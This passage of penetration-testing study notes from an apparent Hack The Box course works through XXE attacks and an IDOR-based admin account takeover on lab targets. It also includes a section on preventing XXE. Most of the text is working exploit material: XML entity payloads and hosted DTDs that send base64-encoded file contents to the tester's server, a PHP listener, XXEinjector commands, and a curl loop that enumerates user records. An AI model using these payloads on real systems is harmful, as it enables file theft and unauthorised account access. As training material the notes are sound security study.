  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->

	-> We do the above lines on burp and should get details of the submitDetails.php file
		-> Obtained source code.

**Note:** In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop), as mentioned in the previous section.

## Error based XXE
- Sometimes web application might not write any output.
	-> In this case, we are blind to our output. 
- E.g. Different Contact Form
	-> No xml ooutput is displayed on the screen.
	-> try to send an malformed XML data (e.g. non-existent xml entitiy) through burp
		-> Error output revealed webserver directory and we can use this to read the source code of other files

	-> We'll use a similar technique as in ## Advanced Data Exfilitration
and we can host a DTD file that contains the following payload:
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

		-> This payload would throw an error saying the %nonExistingEntity; file does not exist, along with the content of %file; as part of an error.

	-> We can call our external DTD script and then reference the error entitiy
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>

	-> We host our DTD scripts, send the above payload as our XML data (no need to include other XML data), we will get the content of /etc/hosts file

		-> This method can also be used to source code of files, we just need to point to the file we want to read (e.g. "file:///var/www/html/submitDetails.php") and is not as reliable as the previous method for reading source files (it may have length restrictions and certain characters and still break it, as it does not have CDATA like the previous one).

## Questions
Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').

CDATA method:
- Use the following payload (ref ##Advanced Exfiltration with CDATA)
	-> Using burp:
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file://flag.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://10.10.16.4:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>

	with xxe.dtd defined as follows:
<!ENTITY joined "%begin;%file;%end;">
	-> didn't quite work, we will try the error-based way.
		-> missed an > at the end, now it worked.

Error based method
- Naviagate to error page, then burp operations (## Error based XXE):
	-> Include  /flag.php and host xxe.dt
	<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>"> 

	-> Calling xxe.dtd
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.16.4:8000/xxe.dtd">
  %remote;
  %error;
]>
	-> found the flag somewhere in the second error message.
```

#### Blind Data Exfiltration
```
## Out-of-band Data Exfilitration
- In our previous attacks, we utilised out-of-band (make the web application connect to us) attack technique.
- This time we will perform similar thing, instead make the web application send a web request to our server with the content we are reading (instead of outputting to a XML entity).

- E.g. Contact form cont.
	-> We can achieve this by first using a parameter entity for the content of the file we are reading while utilizing a php filter to base64 encode it.
	-> Then, we will create another external parameter entity and reference it to our IP, and place the file parameter value as part of the URL being requested over HTTP, as follows

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
		
		-> The file parameter would hold the base64 encoded data and when XML tries to reference the external oob parameter from our machine, it will request http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB, assuming WFhFX1NBTVBMRV9EQVRB is the encoded data for the file we want to read.

	-> We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it in the terminal:
	
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>

	-> We will first write the PHP code into index.php and then start a PHP server on port 8000:
areaeric@htb[/htb]$ vi index.php # here we write the above PHP code
areaeric@htb[/htb]$ php -S 0.0.0.0:8000

	-> To initiate the attack, we can use the following payload:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>

	-> Send the following through burp and we would receive our response back.

PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin

**Tip:** In addition to storing our base64 encoded data as a parameter to our URL, we may utilize `DNS OOB Exfiltration` by placing the encoded data as a sub-domain for our URL (e.g. `ENCODEDTEXT.our.website.com`), and then use a tool like `tcpdump` to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.

## Automated OOB Exfilitration
- Tools to help automated the process of blind XXE data exfiltration
	-> cloning the tool:
areaeric@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git

	-> E.g. To use the tool, copy the HTTP request from burp, remove everything except the first line of the request and type XXEINJECT

POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT

	-> --host/--httpport, --file being the file we wrote, and the --path flag being the flag we want to read. Using --oob=http and --phpfilter allows us to repeat our attack above

areaeric@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

	-> We can read the exfiltrated files through the logs folder under the tool:
areaeric@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...SNIP..

## Questions
Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag.

- Perform manual data exfiltration (referencing ## Out-of-band Data Exfiltration)
	-> crafting payload as xxe.dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.16.4:8000/?content=%file;'>">

	-> creating index.php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>

	-> Starting the server:
areaeric@htb[/htb]$ vi index.php # here we write the above PHP code
areaeric@htb[/htb]$ php -S 0.0.0.0:8000

	-> crafting the xml payload:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.16.4:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>

	-> get flag

- using automated tools (ref ## Automated OOB Exfiltration)
	-> Cloning the tool 
git clone https://github.com/enjoiz/XXEinjector.git

	-> Copied burp request, named as xxe.req
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.6.114
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.6.114/blind/
Content-Type: text/plain;charset=UTF-8
Content-Length: 169
Origin: http://10.129.6.114
DNT: 1
Connection: close

<?xml version="1.0" encoding="UTF-8"?>

	-> Configuring and running the tool 
ruby XXEinjector.rb --host=10.10.16.4 --httpport=8000 --file=xxe.req --path=/327a6c4304ad5938eaf0efb6cc3e53dc.php --oob=http --phpfilter

	-> getting flag
	cat Logs/10.129.6.114/327a6c4304ad5938eaf0efb6cc3e53dc.php
```

#### XXE Prevention
```
## Overview
- We have seen that XXE vulnerabilities mainly occur when an unsafe XML input references an external entity, which is eventually exploited to read sensitive files and perform other actions. 
 
	-> Preventing XXE vulnerabilities is relatively easier than preventing other web vulnerabilities, as they are caused mainly by outdated XML libraries.

## Avoiding Outdated Components

- While other input validation web vulnerabilities are usually prevented through secure coding practices (e.g., XSS, IDOR, SQLi, OS Injection), this is not entirely necessary to prevent XXE vulnerabilities. 
 
	-> This is because XML input is usually not handled manually by the web developers but by the built-in XML libraries instead. So, if a web application is vulnerable to XXE, this is very likely due to an outdated XML library that parses the XML data.

- For example, PHP's [libxml_disable_entity_loader](https://www.php.net/manual/en/function.libxml-disable-entity-loader.php) function is deprecated since it allows a developer to enable external entities in an unsafe manner, which leads to XXE vulnerabilities.

	-> If we visit PHP's documentation for this function, we see warnings.

**Note:** You can find a detailed report of all vulnerable XML libraries, with recommendations on updating them and using safe functions, in [OWASP's XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#php).

- In addition to updating the XML libraries, we should also update any components that parse XML input, such as API libraries like SOAP. 
 
	-> Furthermore, any document or file processors that may perform XML parsing, like SVG image processors or PDF document processors, may also be vulnerable to XXE vulnerabilities, and we should update them as well.

- These issues are not exclusive to XML libraries only, as the same applies to all other web components (e.g., outdated `Node Modules`). 
 
	-> In addition to common package managers (e.g. `npm`), common code editors will notify web developers of the use of outdated components and suggest other alternatives. 
	
	-> In the end, `using the latest XML libraries and web development components can greatly help reduce various web vulnerabilities`, including XXE.

## Using Safe XML Configurations

- Other than using the latest XML libraries, certain XML configurations for web applications can help reduce the possibility of XXE exploitation. These include:

	- Disable referencing custom `Document Type Definitions (DTDs)`
	- Disable referencing `External XML Entities`
	- Disable `Parameter Entity` processing
	- Disable support for `XInclude`
	- Prevent `Entity Reference Loops`

- Another thing we saw was Error-based XXE exploitation. So, we should always have proper exception handling in our web applications and `should always disable displaying runtime errors in web servers`.

- Such configurations should be another layer of protection if we miss updating some XML libraries and should also prevent XXE exploitation. 
 
	-> However, we may still be using vulnerable libraries in such cases and only applying workarounds against exploitation, which is not ideal.

- With the various issues and vulnerabilities introduced by XML data, many also recommend `using other formats, such as JSON or YAML`. 
 
	-> This also includes avoiding API standards that rely on XML (e.g., SOAP) and using JSON-based APIs instead (e.g., REST).

- Finally, using Web Application Firewalls (WAFs) is another layer of protection against XXE exploitation.
 
	-> However, we should never entirely rely on WAFs and leave the back-end vulnerable, as WAFs can always be bypassed.
```


## Skills assessment
```
## Scenario

You are performing a web application penetration test for a software development company, and they task you with testing the latest build of their social networking web application. Try to utilize the various techniques you learned in this module to identify and exploit multiple vulnerabilities found in the web application.

The login details are provided in the question below.

Authenticate to 83.136.253.251 with user "htb-student" and password "Academy_student!"

-> Logged in and examined source code.
	-> something interesting we see is this line code:
	fetch(`/api.php/user/${$.cookie("uid")}`

	-> maybe idor related, C is also satisfied for related section (## Insecure parameters in section Mass IDOR Enumeration), so checking it with burp.
		-> checks: trying uid 74 and 73 for /api.php/user/uid with get method

		uid=74: {"uid":"74","username":"htb-student","full_name":"Paolo Perrone","company":"Schaefer Inc"}

		uid=73: {"uid":"73","username":"s.nutt","full_name":"Sequoia Nutt","company":"Wiza - Abernathy"}

			-> idor vulnerability (information disclosure) identified

	-> C satisified for ## Mass Enumeration, so we will attempt to do those from uid=1 to 100.

	for i in {1..100}; do
			curl -s http://83.136.253.251:45066/api.php/user/$i >> employee_info
		done

		Extra Note: Lucky this worked, if not we'll have to do add extra cookies and uid for our header.

		-> searching through the 100 uid we enumerated, we see a that seems to be admin:
		{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}

		-> combined with the uid value in cookie, we can attempt to update the value of the cookie to potentially exploit IDOR api we need to find somewhere.

		-> Looking around we see a settings page that we can change our password, we will intercept it with burp.
			->  we see the following in the post request
		Cookie: PHPSESSID=9glu0i04qc33mool1p47dkasv3; uid=74

		uid=74&token=e51a8a14-17ac-11ec-8e67-a3c050fe0c26&password=1

			-> we will perform identify IDOR api calls by changing the admin password to something simple (C is met for section ## Identifying Insecure APIs)

		Cookie: PHPSESSID=9glu0i04qc33mool1p47dkasv3; uid=52

		uid=52&token=e51a8a14-17ac-11ec-8e67-a3c050fe0c26&password=123

			-> access denied.

			-> will look around for other api's/exploits
				-> In get /profile.php, let' try change the uid to 52 and see what happens.
			-> seems like we have admin access. 
				-> let's try change the password now.
				-> also failed
		-> the thing I can see interesting is this function:  fetch(`/api.php/token/${$.cookie("uid")}`, {
                    method: 'GET'

		let's have a look and see if there is IDOR:
		/api.php/token/${$.cookie("uid")
			-> maybe the token is exposed as well?
		/api.php/token/52

		-> also got token for user with uid 52: {"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}

		-> acces control of the application is based on uid and token in the front end, maybe there is no back end access control for changing password (?)
			-> now we can change password and login as admin user.
			-> go to setting .php and change it to a simple password of 123
		-> was suspicious about the access denied and tried tampering- (access control could be applied on the POST but not on the GET parameter). We also met the C for security filtering (the filter here is the access control).
			-> bypass success, we can now login as the admin user. 

- Logging in as admin and planning next step:
	a.corrales:123

	-> Looking around the website found a add event functionality, let's take a look at that by using burp:
	<root>
	    <name>1</name>
	    <details>1</details>
	     <date>2024-05-17</date>
    </root>
    
	-> name tag is being processed.
	
		-> See an xml document, met C for XMl testing.
		
	<!DOCTYPE name [
  <!ENTITY company "Inlane Freight">
]>
		-> vulnerable to xxe injection.
		-> end goal is /flag.php,

	-> use ## Advanced Exfiltration with CDATA techniques, we met C here and is the most universal technique. 

		->payload construction:
		
<!DOCTYPE name [
  <!ENTITY % begin "<![CDATA["> 
  <!ENTITY % file SYSTEM "file://flag.php"> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "http://10.10.16.4:8000/xxe.dtd"> 
  %xxe;
]>

...

<name>&joined;</name>

		-> xxe.dtd file
<!ENTITY joined "%begin;%file;%end;">

		-> hosting web server
		python -m http.server 8000

		-> not working, maybe external entity have been disabled. Try base64 method. 
	<!DOCTYPE name [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
			-> got base64 encoded data.
		-> decoding data:
echo 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d
			-> got flag

	-> reason why it not might work is that it disabled external xml entities.
```

